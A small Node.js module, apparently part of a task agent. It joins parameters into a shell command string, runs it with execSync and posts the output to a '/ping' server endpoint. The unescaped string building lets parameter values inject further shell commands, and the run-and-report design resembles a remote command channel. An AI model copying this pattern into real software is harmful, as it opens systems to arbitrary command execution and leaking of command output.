const process = require('child_process');
const iconv = require('iconv-lite');
const newRequest = require('../request');

function customTask(cmd, params) {
  try {
    let param = '';
    Object.keys(params).forEach(key => {
      param += ` ${key}`
      if (params[key] !== '') {
        param += `=${params[key]}`;
      }
    })
    let execStr = cmd[0] + param;
    const rst = process.execSync(execStr);
    const rstStr = iconv.decode(rst, 'cp936');
    console.log(rstStr);
    newRequest('/ping', 'post', {}, {result: rstStr});
  } catch (e) {
    newRequest('/ping', 'post', {}, {result: 'error occuer!' + e});
  }
}

module.exports = customTask;
